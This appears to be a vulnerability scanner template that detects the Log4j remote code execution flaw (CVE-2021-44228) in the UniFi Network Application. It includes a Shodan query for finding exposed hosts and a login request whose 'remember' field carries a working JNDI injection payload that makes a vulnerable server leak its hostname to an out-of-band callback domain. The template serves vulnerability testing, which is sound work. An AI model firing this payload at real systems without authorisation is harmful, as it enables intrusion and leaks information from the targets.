id: unifi-network-log4j-rce
info:
  name: UniFi Network Application - Remote Code Execution (Apache Log4j)
  author: KrE80r
  severity: critical
  description: The UniFi Network Application is vulnerable to a critical Apache Log4j
    vulnerability, which can lead to remote code execution in impacted systems.
  reference:
  - https://community.ui.com/releases/UniFi-Network-Application-6-5-55/48c64137-4a4a-41f7-b7e4-3bee505ae16e
  - https://twitter.com/sprocket_ed/status/1473301038832701441
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: http.title:"UniFi Network"
    verified: 'true'
    impact: The unifi-network-log4j-rce vulnerability could result in severe consequences,
      such as unauthorized access and control, data theft, or even system crashes,
      due to the remote code execution capabilities of the Apache Log4j vulnerability
      in the UniFi Network Application.
    recommendation: We strongly recommend implementing the necessary updates to address
      the CVE-2021-44228 vulnerability in the UniFi Network Application to prevent
      potential remote code execution attacks.
  tags: cve,cve2021,rce,log4j,ubnt,unifi,oast,jndi,kev
requests:
- raw:
  - 'POST /api/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json; charset=utf-8

    Origin: {{RootURL}}

    Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage


    {"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.{{interactsh-url}}}","strict":true}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
